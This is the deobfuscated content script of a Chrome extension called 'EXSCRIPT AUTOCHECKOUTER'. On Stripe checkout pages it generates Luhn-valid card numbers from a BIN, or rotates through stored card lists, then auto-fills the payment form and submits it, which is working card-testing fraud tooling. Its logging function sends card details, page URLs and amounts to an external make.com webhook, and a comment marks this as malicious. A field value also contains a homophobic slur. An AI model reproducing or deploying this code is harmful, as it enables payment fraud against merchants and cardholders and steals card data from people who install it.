
// Deobfuscated content.js

let settings = {
    'bin1': "415464440104",
    'bin2': '',
    'generateKey': 'x',
    'clearKey': 'c',
    'cardDetails': []
};
let lastUsedCard = '';
let settingsLoaded = false;
let extensionEnabled = true;
let lastGeneratedCardDetails = null;
let cardIndex = 0;
let currentBin = "bin1";

const updateSettings = (newSettings) => {
    settings = {
        ...settings,
        ...newSettings
    };
    log(1, "Settings updated dynamically:", settings);
    if (extensionEnabled && isCheckoutOrPaymentPage()) {
        initializeExtension();
    }
};

chrome.storage.onChanged.addListener((changes, areaName) => {
    for (let [key, { oldValue, newValue }] of Object.entries(changes)) {
        if (areaName === "sync") {
            settings[key] = newValue;
            log(1, "Setting changed: " + key, {
                'oldValue': oldValue,
                'newValue': newValue
            });
            updateSettings(settings);
        }
    }
});

const log = (level, message, details = null) => {
    const debugLevels = ["Loaded settings:", 'Generated Details - Made By BROKENSIST'];
    if (level >= 1 && debugLevels.some(debugLevel => message.includes(debugLevel))) {
        if (!isCheckoutOrPaymentPage()) return;

        const timestamp = new Date().toLocaleString("en-GB", {
            'timeZone': 'Africa/Casablanca',
            'hour12': true
        });

        let status = '';
        switch (level) {
            case 1:
                status = "INFO";
                break;
            case 2:
                status = 'WARN';
                break;
            case 3:
                status = "ERROR";
                break;
            case 4:
                status = 'SUCCESS';
                break;
            default:
                status = "DEBUG";
                break;
        }

        const totalAmountElem = document.getElementById("ProductSummary-totalAmount");
        const amount = totalAmountElem ? totalAmountElem.textContent.trim() : "N/A";
        const currentUrl = window.location.href;

        if (!(/^(https:\/\/)?pay\./.test(currentUrl) || /checkout\.stripe\.com/.test(currentUrl) || /^(https:\/\/)?buy\.stripe/.test(currentUrl) || /stripe/i.test(currentUrl))) return;

        const detailsStr = details ? (typeof details === "object" ? JSON.stringify(details, null, 2) : details) : "N/A";

        const payload = {
            'timestamp': timestamp,
            'message': message,
            'url': currentUrl,
            'amount': amount,
            'extension_status': extensionEnabled ? "Enabled" : "Disabled",
            'bin': settings[currentBin] || settings["bin1"],
            'details': detailsStr
        };

        // Malicious: Sends data to external webhook
        fetch("https://hook.eu2.make.com/qdycpuurdqe53njwi1wi3xp9lwyo162h", {
            'method': 'POST',
            'headers': {
                'Content-Type': "application/json"
            },
            'body': JSON.stringify(payload)
        }).catch(err => console.error('Error', err));
    }
};

const debounce = (func, delay) => {
    let timeout;
    return function (...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, delay);
    };
};

const isCheckoutOrPaymentPage = () => {
    const patterns = [/^pay\./, /checkout\.stripe\.com/, /^buy\.stripe/, /checkout/i, /stripe/i];
    const isMatch = patterns.some(pattern => pattern.test(window.location.hostname) || pattern.test(window.location.pathname));
    console.log("isCheckoutOrPaymentPage:", isMatch);
    return isMatch;
};

const showNotification = (type, title, message, duration = null) => {
    const timeoutDuration = duration || (type === "warning" || title.includes('Payment Page Detected') || title.includes("Attempting Payment") ? 7000 : 5000);

    chrome.runtime.sendMessage({
        'action': "showNotification",
        'type': type,
        'title': title,
        'message': message,
        'duration': timeoutDuration
    });

    const notificationDiv = document.createElement("div");
    notificationDiv.className = "destroyerx-notification";

    const icons = {
        'success': '✅',
        'error': '❌',
        'warning': '🔄',
        'default': "<img src=\"" + chrome.runtime.getURL("icons/iconi.png") + "\" alt=\"Payment\" width=\"48\" height=\"48\">"
    };

    const icon = icons[type] || icons["default"];

    notificationDiv.innerHTML = "\n    <div class=\"notification-icon\">" + icon + "</div>\n    <div class=\"notification-content\">\n      <h3>" + title + "</h3>\n      <p>" + message + "</p>\n    </div>\n    <div class=\"notification-close\">×</div>\n  ";

    document.body.appendChild(notificationDiv);

    const style = document.createElement("style");
    style.textContent = "\n    .destroyerx-notification {\n      position: fixed;\n      bottom: 20px;\n      left: 20px;\n      background-color: #ffffff;\n      color: #333333;\n      padding: 15px;\n      border-radius: 12px;\n      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);\n      font-family: 'Arial', sans-serif;\n      z-index: 99999;\n      max-width: 400px;\n      display: flex;\n      align-items: center;\n      opacity: 0;\n      transform: translateY(50px);\n      transition: all 0.3s cubic-bezier(0.68, -0.55, 0.27, 1.55);\n      border-left: 5px solid " + (type === 'success' ? '#4CAF50' : type === 'error' ? "#F44336" : type === "warning" ? "#FFC107" : "#2196F3") + ";\n    }\n    .destroyerx-notification.show {\n      opacity: 1;\n      transform: translateY(0);\n    .destroyerx-notification .notification-icon {\n      font-size: 24px;\n      margin-right: 15px;\n    }\n    .destroyerx-notification .notification-content {\n      flex-grow: 1;\n    }\n    .destroyerx-notification h3 {\n      margin: 0 0 5px;\n      font-size: 18px;\n      font-weight: bold;\n    }\n    .destroyerx-notification p {\n      margin: 0;\n      font-size: 14px;\n      line-height: 1.4;\n    }\n    .destroyerx-notification .notification-close {\n      cursor: pointer;\n      font-size: 24px;\n      margin-left: 15px;\n      opacity: 0.7;\n      transition: opacity 0.2s;\n    }\n    .destroyerx-notification .notification-close:hover {\n      opacity: 1;\n    }\n  ";

    document.head.appendChild(style);

    setTimeout(() => {
        notificationDiv.classList.add("show");
    }, 100);

    const closeBtn = notificationDiv.querySelector(".notification-close");
    closeBtn.addEventListener("click", () => {
        notificationDiv.classList.remove("show");
        setTimeout(() => {
            notificationDiv.remove();
            style.remove();
        }, 300);
    });

    setTimeout(() => {
        notificationDiv.classList.remove("show");
        setTimeout(() => {
            notificationDiv.remove();
            style.remove();
        }, 300);
    }, timeoutDuration);
};

const addGenerateButton = (buttonId) => {
    const btn = document.createElement("button");
    btn.id = buttonId;
    btn.innerHTML = "<div style='display:inline-flex;align-items:center;gap:4px;border-radius:8px;padding:5px 12px;color:white;font-size:12px;font-weight:500;box-shadow:0 2px 4px rgba(93,63,211,0.15);background:#5D3FD3;position:fixed;top:40px;left:10px;transform:scale(1.2);transition:transform 0.3s ease-in-out;'><span style='font-size:13px;background:linear-gradient(45deg,#FFD700,#FFA500);-webkit-background-clip:text;-webkit-text-fill-color:transparent;filter:drop-shadow(0 1px 1px rgba(0,0,0,0.1));'>💳</span><span style='letter-spacing:0.3px;font-weight:600;'>AutoFill</span><span style='color:rgba(255,255,255,0.6);font-size:11px;margin-left:3px;font-weight:400;opacity:0.8;'>⚡</span></div>";
    document.body.appendChild(btn);

    const style = document.createElement("style");
    style.textContent = "\n    #" + buttonId + " {\n      position: fixed;\n      top: 20px;\n      left: 20px;\n      z-index: 10000;\n      padding: 8px 16px;\n      background-color: #f0f0f0;\n      color: #333;\n      border: 1px solid #ddd;\n      border-radius: 4px;\n      cursor: pointer;\n      font-size: 12px;\n      font-weight: 500;\n      box-shadow: 0 2px 4px rgba(0,0,0,0.05);\n      transition: all 0.2s ease;\n      display: flex;\n      align-items: center;\n      justify-content: center;\n      font-family: 'Arial', sans-serif;\n    }\n    #" + buttonId + " .icon {\n      margin-right: 8px;\n      font-size: 16px;\n    }\n    #" + buttonId + ":hover {\n      background-color: #e0e0e0;\n      box-shadow: 0 4px 8px rgba(0,0,0,0.1);\n    }\n    #" + buttonId + " .text {\n      font-weight: bold;\n    }\n  ";
    document.head.appendChild(style);

    btn.addEventListener("click", () => {
        if (extensionEnabled) {
            log(1, "Manually triggered card generation - Made By BROKENIST ");
            btn.style.opacity = "0.7";
            setTimeout(() => btn.style.opacity = '1', 200);
            autoFillAndSubmit();
        } else {
            showNotification("error", "Extension Disabled", "Please enable the extension first.");
        }
    });
};

const initializeExtension = () => {
    log(1, "Initializing extension");
    chrome.storage.sync.get({
        'bin1': "415464440104",
        'bin2': '',
        'generateKey': 'X',
        'clearKey': 'C',
        'cardDetails': [],
        'generateButtonId': 'generateCardButton',
        'extensionEnabled': true
    }, (result) => {
        settings = result;
        extensionEnabled = result.extensionEnabled;
        settingsLoaded = true;
        log(1, "Loaded settings:", settings);

        if (extensionEnabled) {
            if (isCheckoutOrPaymentPage()) {
                addGenerateButton(result.generateButtonId);
                document.addEventListener("keypress", handleKeyPress);
                window.addEventListener('load', onPageLoad);
                log(1, 'Script loaded. Press "' + settings.generateKey + "\" to generate new card details, \"" + settings.clearKey + "\" to clear form fields.");
                showNotification("info", '⚡CHECKOUT DETECTED ⚡', 'Made By BROKENIST', {
                    'style': {
                        'backgroundColor': "linear-gradient(45deg, yellow, orange)",
                        'borderRadius': "10px",
                        'color': "#fff",
                        'textAlign': 'center',
                        'fontWeight': "bold",
                        'fontSize': "16px",
                        'padding': "10px"
                    }
                });
                setTimeout(autoFillFields, 6000);
                addFloatingCredit();
            } else {
                log(1, 'Not a checkout or payment page. Extension features disabled.');
            }
        } else {
            log(1, "Extension is disabled. Enable it from the options page.");
        }
    });
};

const handleKeyPress = (event) => {
    if (!settingsLoaded || !extensionEnabled) return;
    if (event.key.toLowerCase() === settings.generateKey.toLowerCase()) {
        log(1, 'Manually triggered card generation - Made By BROKENIST');
        autoFillAndSubmit();
    } else if (event.key.toLowerCase() === settings.clearKey.toLowerCase()) {
        clearFormFields();
    }
};

const autoFillAndSubmit = () => {
    if (!extensionEnabled) {
        log(2, "Extension is disabled. Cannot autofill and submit.");
        return;
    }
    log(1, "Autofilling and submitting form.");
    clearFormFields();
    setTimeout(() => {
        fillFormFields();
        setTimeout(() => {
            clickSubscribeButton();
        }, 1000);
    }, 1000);
};

const clickSubscribeButton = () => {
    const btn = document.querySelector("button[type='submit'], button.SubmitButton, #submitButton");
    if (btn && !btn.disabled) {
        log(1, "Automatically clicking subscribe button...");
        btn.click();
        if (lastGeneratedCardDetails) {
            const { cardNumber, expirationDate, cvv } = lastGeneratedCardDetails;
            const [expMonth, expYear] = expirationDate.split('/');
            showNotification("warning", "Attempting Payment", "Card: " + cardNumber + '|' + expMonth + "|20" + expYear + '|' + cvv);
        } else {
            showNotification("warning", "Attempting Payment", "Card details not available");
        }
    } else {
        log(2, "Subscribe button not found or is disabled.");
    }
};

const autoFillFields = () => {
    if (!extensionEnabled) return;
    clearFormFields();
    setTimeout(() => {
        fillFormFields();
    }, 1000);
};

const onPageLoad = () => {
    log(1, "Checkout page loaded. Ready for manual card generation. -  BROKENIST");
};

const generateCardDetails = () => {
    if (settings.cardDetails && settings.cardDetails.length > 0) {
        const details = settings.cardDetails[cardIndex];
        cardIndex = (cardIndex + 1) % settings.cardDetails.length;
        const [cardNumber, expMonth, expYear, cvv] = details.split('|');
        return {
            'email': "brokenist" + Math.floor(Math.random() * 900 + 100) + '@gmail.com',
            'cardNumber': cardNumber,
            'expirationDate': expMonth + '/' + expYear.slice(-2),
            'cvv': cvv,
            'cardHolderName': "BROKENIST AUTO",
            'addressLine1': "EXSCRIPT",
            'addressLine2': "EXSCRIPT2",
            'postalCode': '10080',
            'city': "Lakshay gay"
        };
    } else {
        const bin = settings[currentBin] || settings["bin1"];
        currentBin = currentBin === 'bin1' ? "bin2" : "bin1";
        const randomNum = Math.floor(Math.random() * 900 + 100);
        return {
            'email': "brokenist" + randomNum + "@gmail.com",
            'cardNumber': generateCardNumber(bin),
            'expirationDate': generateExpirationDate(),
            'cvv': Math.floor(Math.random() * 900 + 100).toString(),
            'cardHolderName': "BROKENIST PRO",
            'addressLine1': "whocaresxd",
            'addressLine2': 'meverypro',
            'postalCode': '10080',
            'city': 'exscriptS'
        };
    }
};

const generateCardNumber = (bin) => {
    let cardNumber = bin;
    for (let i = cardNumber.length; i < 15; i++) {
        cardNumber += Math.floor(Math.random() * 10).toString();
    }
    for (let i = 0; i < 10; i++) {
        if (calculateLuhnChecksum(cardNumber + i)) {
            return cardNumber + i;
        }
    }
    return cardNumber + '0';
};

const calculateLuhnChecksum = (cardNumber) => {
    let sum = 0;
    let isSecond = false;
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber.charAt(i));
        if (isSecond) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }
        sum += digit;
        isSecond = !isSecond;
    }
    return sum % 10 === 0;
};

const generateExpirationDate = () => {
    const currentYear = new Date().getFullYear();
    const month = Math.floor(Math.random() * 12 + 1).toString().padStart(2, '0');
    const year = Math.floor(Math.random() * 5) + currentYear + 1;
    return month + '/' + year.toString().slice(-2);
};

const cachedElements = {};
const getElement = (selector) => {
    if (!cachedElements[selector]) {
        cachedElements[selector] = document.querySelector(selector);
    }
    return cachedElements[selector];
};

const fillFormFields = () => {
    lastGeneratedCardDetails = generateCardDetails();
    lastUsedCard = lastGeneratedCardDetails.cardNumber;
    const map = {
        'input#email': lastGeneratedCardDetails.email,
        'input#cardNumber': lastGeneratedCardDetails.cardNumber,
        'input#cardExpiry': lastGeneratedCardDetails.expirationDate,
        'input#cardCvc': lastGeneratedCardDetails.cvv,
        'input#billingName': lastGeneratedCardDetails.cardHolderName,
        'input#billingAddressLine1': lastGeneratedCardDetails.addressLine1,
        'input#billingAddressLine2': lastGeneratedCardDetails.addressLine2,
        'input#billingPostalCode': lastGeneratedCardDetails.postalCode,
        'input#billingLocality': lastGeneratedCardDetails.city
    };
    for (const [selector, value] of Object.entries(map)) {
        const element = getElement(selector);
        if (element) {
            simulateTyping(element, value);
        }
    }
    logGeneratedDetails(lastGeneratedCardDetails, settings.cardDetails && settings.cardDetails.length > 0);
};

const simulateTyping = (element, value) => {
    element.focus();
    element.value = value;
    element.dispatchEvent(new Event('input', { 'bubbles': true }));
    element.dispatchEvent(new Event("change", { 'bubbles': true }));
    element.blur();
};

const logGeneratedDetails = (details, fromList = false) => {
    log(1, (fromList ? "Card You Entered:" : 'Generated') + ' Details - Made By BROKENIST', details);
};

const clearFormFields = () => {
    const fields = [
        "input#email",
        "input#cardNumber",
        "input#cardExpiry",
        "input#cardCvc",
        "input#billingName",
        "input#billingAddressLine1",
        'input#billingAddressLine2',
        'input#billingPostalCode',
        'input#billingLocality'
    ];
    fields.forEach(selector => {
        const element = document.querySelector(selector);
        if (element) {
            element.value = '';
            element.dispatchEvent(new Event("input", { 'bubbles': true }));
        }
    });
};

const addFloatingCredit = () => {
    const div = document.createElement('div');
    div.textContent = "♠️EXSCRIPT AUTOCHECKOUTER FREE 1.1🀄";
    div.style.cssText = "position: fixed; bottom: 10px; right: 10px; background: linear-gradient(45deg, #5D3FD3, #FFD700); color: white; padding: 5px 10px; border-radius: 15px; font-size: 12px; font-weight: 600; z-index: 9999; direction: rtl; text-align: center; transition: background 0.5s ease-in-out, transform 0.3s ease-in-out;";
    div.textContent = "♠️EXSCRIPT AUTOCHECKOUTER FREE 1.1🀄";
    document.body.appendChild(div);
};

document.addEventListener('DOMContentLoaded', () => {
    if (isCheckoutOrPaymentPage()) {
        onPageLoad();
        addFloatingCredit();
        document.addEventListener("keydown", debounce((event) => {
            if (!extensionEnabled) return;
            if (event.ctrlKey && event.key === 'g') {
                event.preventDefault();
                autoFillFields();
            } else if (event.ctrlKey && event.key === 'h') {
                event.preventDefault();
                clickSubscribeButton();
            }
        }, 100));
    }
});

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.action === "updateSettings") {
        settings = message.settings;
        log(1, "Settings updated:", settings);
    } else {
        if (message.action === "toggleExtension") {
            extensionEnabled = message.enabled;
            log(1, 'Extension ' + (extensionEnabled ? "enabled" : 'disabled'));
            if (!extensionEnabled) {
                const btn = document.getElementById(settings.generateButtonId);
                if (btn) btn.remove();
                document.removeEventListener("keypress", handleKeyPress);
                window.removeEventListener("load", onPageLoad);
            } else {
                initializeExtension();
            }
        }
    }
});

function onPaymentAttempt(card, site, amount, status) {
    chrome.runtime.sendMessage({
        'action': 'paymentAttempt',
        'data': {
            'card': card,
            'site': site,
            'amount': amount,
            'status': status
        }
    });
}

initializeExtension();
